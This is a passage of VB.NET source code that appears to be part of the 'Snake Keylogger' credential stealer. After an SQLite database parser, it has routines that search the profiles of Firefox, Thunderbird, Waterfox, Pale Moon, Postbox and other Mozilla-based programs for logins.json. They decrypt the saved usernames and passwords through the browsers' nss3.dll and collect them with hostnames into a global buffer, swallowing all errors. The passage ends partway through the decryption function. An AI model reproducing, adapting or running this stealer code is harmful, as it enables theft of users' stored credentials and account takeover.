                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                End If
            Next
        ElseIf db_bytes(Offset) = &H5 Then
            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ent_offset As UInt16

            For i As Integer = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)

                If Offset = 100 Then
                    ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
                Else
                    ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                End If

            Next

            ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If
    End Sub

    Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
        On Error Resume Next
        If db_bytes(Offset) = &HD Then

            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ol As Integer = 0

            If Not table_entries Is Nothing Then
                ol = table_entries.Length
                ReDim Preserve table_entries(table_entries.Length + Length)
            Else
                ReDim table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i As Integer = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)

                If Offset <> 100 Then ent_offset = ent_offset + Offset


                Dim t = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)


                ent_offset = ent_offset + (s - ent_offset) + 1


                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t)

                Dim Field_Size() As record_header_field
                Dim size_read As Int64 = (ent_offset - t) + 1
                Dim j = 0

                While size_read < Rec_Header_Size
                    ReDim Preserve Field_Size(j)

                    t = s + 1
                    s = GVL(t)
                    Field_Size(j).type = CVL(t, s)

                    If Field_Size(j).type > 9 Then
                        If IsOdd(Field_Size(j).type) Then
                            Field_Size(j).size = (Field_Size(j).type - 13) / 2
                        Else
                            Field_Size(j).size = (Field_Size(j).type - 12) / 2
                        End If
                    Else
                        Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
                    End If

                    size_read = size_read + (s - t) + 1
                    j = j + 1
                End While

                ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                Dim counter As Integer = 0

                For k As Integer = 0 To Field_Size.Length - 1 Step 1
                    If Field_Size(k).type > 9 Then
                        If Not IsOdd(Field_Size(k).type) Then
                            If encoding = 1 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 2 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 3 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            End If
                        Else
                            table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                        End If
                    Else
                        table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
                    End If

                    counter = counter + Field_Size(k).size
                Next
            Next
        ElseIf db_bytes(Offset) = &H5 Then
            Dim Length As UInt16 = ConvertToInteger(Offset + 3, 2) - 1
            Dim ent_offset As UInt16

            For i As Integer = 0 To Length Step 1
                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)

                ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
            Next

            ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If

        Return True
    End Function


    Public Function ReadTable(ByVal TableName As String) As Boolean
        On Error Resume Next

        Dim found As Integer = -1
        '----------------
        For i As Integer = 0 To master_table_entries.Length Step 1
            If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
                found = i
                Exit For
            End If
        Next

        If found = -1 Then Return False

        Dim fields() = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(",")

        For i As Integer = 0 To fields.Length - 1 Step 1
            fields(i) = LTrim(fields(i))

            Dim index = fields(i).IndexOf(" ")

            If index > 0 Then fields(i) = fields(i).Substring(0, index)

            If fields(i).IndexOf("UNIQUE") = 0 Then
                Exit For
            Else
                ReDim Preserve field_names(i)
                field_names(i) = fields(i)
            End If
        Next

        Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
    End Function


    Public Function GetRowCount() As Integer
        On Error Resume Next
        Return table_entries.Length
    End Function

    Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
        On Error Resume Next
        If row_num >= table_entries.Length Then Return Nothing
        If field >= table_entries(row_num).content.Length Then Return Nothing

        Return table_entries(row_num).content(field)
    End Function

    Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
        On Error Resume Next
        Dim found As Integer = -1

        For i As Integer = 0 To field_names.Length Step 1
            If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
                found = i
                Exit For
            End If
        Next

        If found = -1 Then Return Nothing

        Return GetValue(row_num, found)
    End Function

    Public Function GetTableNames() As String()
        Dim retVal As String()
        Dim arr = 0

        For i As Integer = 0 To master_table_entries.Length - 1 Step 1
            If master_table_entries(i).item_type = "table" Then
                ReDim Preserve retVal(arr)
                retVal(arr) = master_table_entries(i).item_name
                arr = arr + 1
            End If
        Next

        Return retVal
    End Function
    Public Sub New(ByVal baseName As String)
        On Error Resume Next

        If File.Exists(baseName) Then
            FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            Dim asi As String = Space(LOF(1))
            FileGet(1, asi)
            FileClose(1)

            db_bytes = System.Text.Encoding.Default.GetBytes(asi)



            page_size = ConvertToInteger(16, 2)
            encoding = ConvertToInteger(56, 4)

            If encoding = 0 Then encoding = 1


            ReadMasterTable(100)
        End If
    End Sub
End Class

#End Region


#Region "Firefox Based"


#Region "Protectors Data Class"



Public Class COVIDRandomz




    Public Shared Sub COVIDSTFireFox()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\Firefox\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then

            End If

            For Each dir As String In dirs


                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir

            If loginsFound Then
                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim ffffire As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    ffffire = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Firefox" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += ffffire


                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception

        End Try
    End Sub

    Public Shared Sub COVIDSTWaterFox()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Waterfox\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then

            End If

            For Each dir As String In dirs


                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir

            If loginsFound Then
                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim ffffire As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    ffffire = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: WaterFox" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += ffffire
                    '  MsgBox("ff" & vbNewLine & username & vbNewLine & password)

                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub COVIDSTThunderbird()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird\Profiles\"))

            Dim logins = ""
            If dirs.Length = 0 Then

            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir



            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim thhhun As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname


                    thhhun = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Thunderbird" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                         & vbNewLine & " ")
                    COVID19.StoragePW += thhhun

                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub





    Public Shared Sub COVIDSTSeaMonkey()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\SeaMonkey\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then
                Exit Sub
            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir


            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim seay As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    seay = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: SeaMonkey" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += seay
                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub COVIDSTIceDragon()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Comodo\IceDragon\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then
                Exit Sub
            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir


            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim seay As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    seay = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Ice Dragon" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += seay
                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub


    Public Shared Sub COVIDSTCyberFox()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "8pecxstudios\Cyberfox\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then
                Exit Sub
            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir


            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim seay As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    seay = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: CyberFox" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += seay
                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub COVIDSTSlim()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FlashPeak\SlimBrowser\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then
                Exit Sub
            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir


            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim seay As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    seay = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Slim" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += seay
                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub COVIDSTIceCat()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\icecat\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then
                Exit Sub
            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir


            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim seay As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    seay = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: IceCat" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += seay
                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub COVIDSTPostBox()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PostboxApp\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then
                Exit Sub
            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir


            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using
                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins
                    Dim seay As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    seay = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: PostBox" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += seay
                Next loginData
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Sub COVIDSTPaleMoon()
        Try
            Dim signonsFile As String = Nothing
            Dim loginsFile As String = Nothing
            Dim signonsFound As Boolean = False
            Dim loginsFound As Boolean = False
            Dim dirs() As String = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Moonchild Productions\Pale Moon\Profiles"))

            Dim logins = ""
            If dirs.Length = 0 Then
                Exit Sub
            End If

            For Each dir As String In dirs
                Dim files() As String = Directory.GetFiles(dir, "logins.json")
                If files.Length > 0 Then
                    loginsFile = files(0)
                    loginsFound = True
                End If

                If loginsFound = True Then
                    NSS_Inite(dir)
                    Exit For
                End If

            Next dir


            If loginsFound = True Then

                Dim ffLoginData As FFLogins
                Using sr As StreamReader = New StreamReader(loginsFile)
                    Dim json As String = sr.ReadToEnd()
                    Dim js As New System.Web.Script.Serialization.JavaScriptSerializer
                    ffLoginData = js.Deserialize(Of FFLogins)(json)
                End Using

                'MAMOSTA ESH NAKA CHUNKA AWA classi projaya tra krditmawa lera hay kerm




                For Each loginData As aaalogshsindgdaLogndta In ffLoginData.logins


                    Dim seay As String = ""
                    Dim username As String = FFDecryptor.Decrypt(loginData.encryptedUsername)
                    Dim password As String = FFDecryptor.Decrypt(loginData.encryptedPassword)
                    Dim hosytt = loginData.hostname
                    seay = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: PaleMoon" & vbNewLine & "Host: " & hosytt & vbNewLine & "USR: " & username & vbNewLine & "PSWD: " & password & vbNewLine & "---------------------------------" _
                     & vbNewLine & " ")
                    COVID19.StoragePW += seay

                Next loginData

                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Class FFLogins
        Public Property nextId() As Long
        Public Property logins() As aaalogshsindgdaLogndta()
        Public Property disabledHosts() As String()
        Public Property version() As Integer
    End Class

    Private Class aaalogshsindgdaLogndta
        Public Property id() As Long
        Public Property hostname() As String
        Public Property url() As String
        Public Property httprealm() As String
        Public Property formSubmitURL() As String
        Public Property usernameField() As String
        Public Property passwordField() As String
        Public Property encryptedUsername() As String
        Public Property encryptedPassword() As String
        Public Property guid() As String
        Public Property encType() As Integer
        Public Property timeCreated() As Long
        Public Property timeLastUsed() As Long
        Public Property timePasswordChanged() As Long
        Public Property timesUsed() As Long
    End Class
End Class

#End Region

#Region "FF Decryptor"

Friend Module FFDecryptor
    <DllImport("kernel32.dll")>
    Public Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function
    Private NSS3 As IntPtr
    Public hModuleList As New List(Of IntPtr)
    <DllImport("kernel32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
    Public Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Private Delegate Function DLLFunctionDelegate6() As Long
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)>
    Public Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
    Private Function CreateAPI(Of T)(ByVal hModule As IntPtr, ByVal method As String) As T
        On Error Resume Next
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, method), GetType(T)), Object), T)
    End Function
    Function NSS_Shutdown() As Long
        Return CreateAPI(Of DLLFunctionDelegate6)(NSS3, "NSS_Shutdown")()
    End Function
    <DllImport("kernel32.dll", SetLastError:=True, EntryPoint:="FreeLibrary")>
    Function FreeLibrary(ByVal hModule As IntPtr) As Boolean
    End Function
    Function NSS_Inite(ByVal configdir As String) As Long
        Dim MozillaPath As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Thunderbird\"
        Dim MozillaPathh As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Mozilla Thunderbird\"
        Dim MozillaPath1 As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        Dim MozillaPathh2 As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Mozilla Firefox\"
        Dim MozillaPath11 As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\SeaMonkey\"
        Dim MozillaPathh22 As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\SeaMonkey\"
        Dim iceddraggg As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Comodo\IceDragon\"
        Dim iceddragggg As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Comodo\IceDragon\"
        Dim cybbbfo As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Cyberfox\"
        Dim cybbbfooo As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Cyberfox\"
        Dim palllem As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Pale Moon\"
        Dim palllemon As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Pale Moon\"
        Dim WatterFoxx As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Waterfox Current\"
        Dim WatterFoxx2 As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Waterfox Current\"
        Dim TheSlimbrwss As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\SlimBrowser\"
        Dim TheSlimbrwss22 As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\SlimBrowser\"
        Dim IceCatt As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Mozilla Firefox\"
        Dim IceCatt222 As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Mozilla Firefox\"
        Dim PosttBox As String = Environment.GetEnvironmentVariable("PROGRAMFILES") & "\Postbox\"
        Dim PosttBox22 As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) & "\Postbox\"
        Dim kk As String = Nothing
        If IO.Directory.Exists(MozillaPath) Then
            kk = MozillaPath
        ElseIf IO.Directory.Exists(MozillaPath1) Then
            kk = MozillaPath1
        ElseIf IO.Directory.Exists(MozillaPathh) Then
            kk = MozillaPathh
        ElseIf IO.Directory.Exists(MozillaPathh2) Then
            kk = MozillaPathh2
        ElseIf IO.Directory.Exists(MozillaPath11) Then
            kk = MozillaPath11
        ElseIf IO.Directory.Exists(MozillaPathh22) Then
            kk = MozillaPathh22
        ElseIf IO.Directory.Exists(iceddraggg) Then
            kk = iceddraggg
        ElseIf IO.Directory.Exists(iceddragggg) Then
            kk = iceddragggg
        ElseIf IO.Directory.Exists(cybbbfo) Then
            kk = cybbbfo
        ElseIf IO.Directory.Exists(cybbbfooo) Then
            kk = cybbbfooo
        ElseIf IO.Directory.Exists(palllemon) Then
            kk = palllemon
        ElseIf IO.Directory.Exists(palllem) Then
            kk = palllem
        ElseIf IO.Directory.Exists(WatterFoxx) Then
            kk = WatterFoxx
        ElseIf IO.Directory.Exists(WatterFoxx2) Then
            kk = WatterFoxx2
        ElseIf IO.Directory.Exists(TheSlimbrwss) Then
            kk = TheSlimbrwss
        ElseIf IO.Directory.Exists(TheSlimbrwss22) Then
            kk = TheSlimbrwss22
        ElseIf IO.Directory.Exists(IceCatt) Then
            kk = IceCatt
        ElseIf IO.Directory.Exists(IceCatt222) Then
            kk = IceCatt222
        ElseIf IO.Directory.Exists(PosttBox) Then
            kk = PosttBox
        ElseIf IO.Directory.Exists(PosttBox22) Then
            kk = PosttBox22

        End If
        hModuleList.Add(LoadLibrary(kk & "\mozglue.dll"))
        NSS3 = LoadLibrary(kk & "\nss3.dll")
        hModuleList.Add(NSS3)
        Return CreateAPI(Of DLLFunctionDelegate)(NSS3, "NSS_Init")(configdir)
    End Function

    Public Function Decrypt(ByVal cypherText As String) As String
        Dim ffDataUnmanagedPointer As IntPtr = IntPtr.Zero
